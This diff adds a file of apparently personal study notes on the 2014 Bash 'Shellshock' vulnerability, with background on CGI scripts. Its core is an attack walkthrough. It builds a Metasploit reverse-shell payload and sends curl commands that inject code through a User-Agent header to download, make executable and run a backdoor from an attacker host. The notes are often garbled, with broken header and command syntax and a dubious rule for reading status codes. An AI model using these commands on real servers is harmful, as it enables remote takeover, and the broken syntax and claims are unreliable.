@@ -1,0 +1,36 @@
+The first topic which should be discuss it SHELL. What exactly is it ? By definition it is a program which allows interaction between users and operating system. User is able to enter the commands and system will display the output. This interaction is not mandatory, applications can be more independent.
+SHELLS can be divine into two types the first one is text shell and the other one is graphic shell.
+
+- Security Vulnerability in UNIX BASH SHELL
+- Remote Code Execution Vulnerability
+- Disclosed on 24 SEPT 2014
+- Based version upto 4.3, exists 25 years
+- CVE 2014-6271, 6277, 6278, 7196
+
+Env x=’(){ :;{; command’ this notation allows to execute command which should be threat as longs string of content in function.
+
+Attacks vector:
+-	HTTP (CGI pages)
+-	SSH (require auth)
+-	DHCP (server)
+
+We need to create our payload:
+Msfpayload linux/x64/shell/reverse_tcp LHOST=192.168.0.2 LPORT=4444 X ? /tmp/backdoor
+
+Curl -l -H ‘User:Agent: () { :;}; /bin/bash -c “wget http://192.168.0.2/backdoor -O /tmp/backdoor”’ http://192.168.0.3/vgi-bin/cgi_script.cgi
+Curl -l -H ‘User:Agent: () { :;}; /bin/bash -c “chmod +x /tmp/backdoor”’ http://192.168.0.3/vgi-bin/cgi_script.cgi
+Curl -l -H ‘User:Agent: () { :;}; /bin/bash -c “exec /tmp/backdoor”’ http://192.168.0.3/vgi-bin/cgi_script.cgi
+Error code 200 – indicates that server is not vulnerable,
+Error code 500– indicates that server is vulnerable.
+
+CGI (Common Gateway Interface) allows to run programs that execute like Console applications (also called Command-line interface programs) running on a web-server that generates web pages dynamically. 
+Such programs are known as CGI scripts or simply as CGIs. The specifics of how the script is executed by the server are determined by the server. In the common case, a CGI script executes at the time a request is made and generates HTML.
+In brief, the CGI program receives HTTP forms data via Unix/Linux standard input, and most other data (such as URL paths, URL arguments, and HTTP header data) via well-known Unix/Linux process environment variables.
+CGI-BIN it is directory where we can store end execute scirpts .cgi, usual wrote in PERLL. Today it is not used anymore because of PHP solution.
+
+Method	                |	Where is the script code located ?	|	Where is the script code executed ? 
+CGI	                    |	In files in the CGI-BIN directory on the server.	|	On the server. 
+PHP, ColdFusion, ASP	|	Embedded in the HTML document.	    |	On the server. 
+Javascript	            |	Embedded in the HTML document.	    |	On the user's PC by their browser. 
+Java	                |	In files on the server.         	|	On the user's PC by their browser. 
+
